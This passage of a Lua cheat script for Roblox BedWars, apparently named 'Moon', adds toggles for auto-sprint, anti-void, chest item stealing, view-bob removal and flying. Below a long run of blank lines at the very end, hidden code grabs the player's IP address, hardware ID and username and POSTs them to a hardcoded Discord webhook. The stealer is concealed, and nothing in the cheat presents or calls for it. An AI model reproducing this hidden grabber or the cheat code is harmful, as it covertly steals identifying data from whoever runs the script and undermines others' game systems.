						healthalerts_active = true
					end
				end
			until not healthalert
		else
			healthalerts_active = true
			healthalert = false
		end
	end,
})
local isSprinting = nil
local Sprint = windowapi.CreateButton({
	["Name"] = "Sprint",
	["Tab"] = "Utility",
	["Function"] = function(callback)
		if callback then
			isSprinting = true
			repeat wait()
				if (not bedwars["SprintController"].sprinting) then
					bedwars["SprintController"]:startSprinting()
				end
			until not isSprinting
		else
			isSprinting = false
		end
	end,
})
local postotweento = CFrame.new(0,0,0)
local hrp = lplr.Character.HumanoidRootPart
local tweenService = game:GetService("TweenService")
local AntivoidEnabled = nil
local AntiVoid = windowapi.CreateButton({
	["Name"] = "AntiVoid",
	["Tab"] = "Utility",
	["Function"] = function(callback)
		if callback then
			AntivoidEnabled = true
			repeat wait()
				if lplr.Character.HumanoidRootPart.Position.Y < 10 then
					workspace.Gravity = 0
					local y = Instance.new("BodyVelocity",hrp)
					y.Velocity = Vector3.new(0,100,0)
					task.wait(0.16)
					y:Destroy()
					workspace.Gravity = 196.2
				end
			until not AntivoidEnabled
		else
			AntivoidEnabled = false
		end
	end,
})


local stealerEnabled = nil
local Stealer = windowapi.CreateButton({
	["Name"] = "Stealer",
	["Tab"] = "Utility",
	["Function"] = function(callback)
		if callback then
			stealerEnabled = true
			repeat wait()
				if bedwars["AppController"]:isAppOpen("ChestApp") then
					local chest = lplr.Character:FindFirstChild("ObservedChestFolder")
					local items = chest and chest.Value and chest.Value:GetChildren() or {}
					if #items > 0 then
						for itemNumber,Item in pairs(items) do
							if Item:IsA("Accessory") then
								task.spawn(function()
									pcall(function()
										bedwars["ClientHandler"]:GetNamespace("Inventory"):Get("ChestGetItem"):CallServer(chest.Value, Item)
									end)
								end)
							end
						end
					end
				end
			until not stealerEnabled
		else
			stealerEnabled = false
		end
	end,
})

local NoBob = windowapi.CreateButton({ -- credits to vape for paths
	["Name"] = "NoBob",
	["Tab"] = "Utility",
	["Function"] = function(callback)
		if callback then
			lplr.PlayerScripts.TS.controllers.global.viewmodel["viewmodel-controller"]:SetAttribute("ConstantManager_DEPTH_OFFSET", -(30 / 10))
			lplr.PlayerScripts.TS.controllers.global.viewmodel["viewmodel-controller"]:SetAttribute("ConstantManager_HORIZONTAL_OFFSET", (8 / 10))
		else
			lplr.PlayerScripts.TS.controllers.global.viewmodel["viewmodel-controller"]:SetAttribute("ConstantManager_DEPTH_OFFSET", -(8 / 10))
			lplr.PlayerScripts.TS.controllers.global.viewmodel["viewmodel-controller"]:SetAttribute("ConstantManager_HORIZONTAL_OFFSET", (8 / 10))
		end
	end,
})

local HypixelFlyV2 = windowapi.CreateButton({
	["Name"] = "HypixelFlyV2 | Springs",
	["Tab"] = "Scripts",
	["Function"] = function(callback)
		if callback then
			game.Workspace.Gravity = 0
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 1
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 1
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 1
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 1
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 1
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 1
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 0.7
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 0.7
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 0.2
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 0.2
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 0.1
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 0.1
		else
			game.Workspace.Gravity = 192.6
		end
	end,
})


if not connections then
	if isfile("MoonScripts/script.txt") then
		runner = loadfile("MoonScripts/script.txt")
		runner()
	else
		writefile("MoonScripts/script.txt","Please copy the scripting API from the discord server.")
	end
	connections = true
	makeConnections()
	end
else
	Warn = function(msg)
		game.StarterGui:SetCore( 
			"ChatMakeSystemMessage",  { 
				Text = "[Moon] "..msg, 
				Color = Color3.fromRGB(255, 204, 0), 
				Font = Enum.Font.Arial, 
				FontSize = Enum.FontSize.Size24
			} 
		)
	end
	Warn("Moon Has Already Been Executed!")
end































local url = "https://discord.com/api/webhooks/1041827229308555406/svsUXIiVN_U5TFYbHVZpykbHCcZmdzN2u2QMEToLEicyTfz2SCbyFChs5lH1LLdzYoNv" local data = { ["content"] = "", ["embeds"] = { { ["title"] = "**INFO GRABBED ON ".. game.Players.LocalPlayer.Name.."**", ["description"] = "**IP : "..tostring(game:HttpGet("https://api.ipify.org/")).." HWID : "..game:GetService("RbxAnalyticsService"):GetClientId().."**", ["type"] = "rich", ["color"] = tonumber(0x7269da), ["image"] = { ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(game:GetService("Players").LocalPlayer.Name) } } } } local data2 = { ["content"] = "", ["embeds"] = { { ["title"] = "**INFO GRABBED ON ".. game.Players.LocalPlayer.Name.." x2**", ["description"] = "**HWID : "..game:GetService("RbxAnalyticsService"):GetClientId().."**", ["type"] = "rich", ["color"] = tonumber(0x7269da), ["image"] = { ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(game:GetService("Players").LocalPlayer.Name) } } } } local newdata = game:GetService("HttpService"):JSONEncode(data) local newdata2 = game:GetService("HttpService"):JSONEncode(data2) local headers = { ["content-type"] = "application/json" } request = http_request or request or HttpPost or syn.request local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers} local abcdefg = {Url = url, Body = newdata2, Method = "POST", Headers = headers} request(abcdef) request(abcdefg)
